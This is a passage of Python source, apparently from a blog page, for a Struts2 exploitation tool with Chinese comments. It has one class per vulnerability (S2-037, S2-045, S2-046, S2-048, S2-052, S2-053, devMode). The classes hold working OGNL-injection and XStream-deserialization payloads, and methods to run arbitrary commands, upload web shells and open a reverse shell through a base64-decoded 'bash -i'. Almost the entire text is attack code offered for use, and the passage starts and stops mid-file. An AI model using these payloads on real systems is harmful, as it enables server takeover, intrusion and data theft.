&quot;(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&#x27;/&#x27;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-037&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_045:</span><br><span class="line">    &quot;&quot;&quot;S2-045漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span><br><span class="line">    web_path = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath(&quot;/&quot;))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;&quot;&quot;</span><br><span class="line">    exec_payload = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;CMD&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;&quot;&quot;</span><br><span class="line">    upload_payload = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#fos= new java.io.FileOutputStream(#req.getParameter(&quot;f&quot;)),#fos.write(#req.getParameter(&quot;t&quot;).getBytes()),#fos.close()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(&quot;OK&quot;),(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())))&#125;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.data = data</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-045&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.web_path</span><br><span class="line">        html = post(self.url, self.data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.exec_payload.replace(&#x27;CMD&#x27;, cmd)</span><br><span class="line">        html = post_stream(self.url, self.data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;?t=&#123;shell&#125;&amp;f=&#123;path&#125;&quot;.format(shell=quote(shell), path=upload_path)</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.upload_payload</span><br><span class="line">        html = post(self.url + data, self.data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_046:</span><br><span class="line">    &quot;&quot;&quot;S2-046漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span><br><span class="line">    web_path = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#res.getWriter().print(&#x27;&#x27;)).(#res.getWriter().print(&#x27;&#x27;)).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath(&#x27;/&#x27;))).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    check_poc = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#res.getWriter().print(&#x27;security_&#x27;)).(#res.getWriter().print(&#x27;check&#x27;)).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    exec_payload = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#s=new java.util.Scanner((new java.lang.ProcessBuilder(&#x27;CMD&#x27;.toString().split(&#x27;\\\\s&#x27;))).start().getInputStream()).useDelimiter(&#x27;\\\\AAAA&#x27;)).(#str=#s.hasNext()?#s.next():&#x27;&#x27;).(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())&#125;\0b&quot;</span><br><span class="line">    upload_paylaod = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#filecontent=&#x27;SHELL&#x27;).(new java.io.BufferedWriter(new java.io.FileWriter(&#x27;PATH&#x27;)).append(new java.net.URLDecoder().decode(#filecontent,&#x27;ENCODING&#x27;)).close()).(#res.getWriter().print(&#x27;O&#x27;)).(#res.getWriter().print(&#x27;K&#x27;)).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (self.check_poc.replace(&#x27;ENCODING&#x27;, self.encoding), b&#x27;x&#x27;, &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &#x27;security_check&#x27;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-046&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (self.web_path.replace(&#x27;ENCODING&#x27;, self.encoding), b&#x27;x&#x27;, &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        paylaod = self.exec_payload.replace(&#x27;CMD&#x27;, cmd).replace(&#x27;ENCODING&#x27;, self.encoding)</span><br><span class="line">        html = post_file(self.url, paylaod, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (</span><br><span class="line">            self.upload_paylaod.replace(&#x27;SHELL&#x27;, quote(shell)).replace(&#x27;PATH&#x27;, upload_path).replace(&#x27;ENCODING&#x27;,</span><br><span class="line">                                                                                                    self.encoding),</span><br><span class="line">            b&#x27;x&#x27;,</span><br><span class="line">            &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_048:</span><br><span class="line">    &quot;&quot;&quot;S2-048漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;%24%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream())).(%23q)%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-048&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_052:</span><br><span class="line">    &quot;&quot;&quot;S2-052漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-052:影响版本Struts 2.1.2-2.3.33,2.5-2.5.12; POST请求发送数据,不需要参数; 支持任意命令执行(无回显)和反弹shell,不支持检测该漏洞是否存在&quot;</span><br><span class="line">    exec_payload = &quot;&quot;&quot;&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &#123;cmd&#125;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/xml&#x27;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd, type=&#x27;xml&#x27;)</span><br><span class="line">        data = self.exec_payload.format(cmd=cmd)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_053:</span><br><span class="line">    &quot;&quot;&quot;S2-053漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;%25%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D&#x27;&#123;cmd&#125;&#x27;).(%23iswin%3D(%40java.lang.System%40getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(%23cmds%3D(%23iswin%3F%7B&#x27;cmd.exe&#x27;%2C&#x27;%2Fc&#x27;%2C%23cmd%7D%3A%7B&#x27;%2Fbin%2Fbash&#x27;%2C&#x27;-c&#x27;%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A&quot;</span><br><span class="line">    shell = &quot;&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-053&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_devMode:</span><br><span class="line">    &quot;&quot;&quot;S2-devMode漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span><br><span class="line">    web_path = &quot;?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=Is-Struts2-Vul-URL&amp;pp=%2f&amp;reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;</span><br><span class="line">    exec_payload = &quot;?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-devMode&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        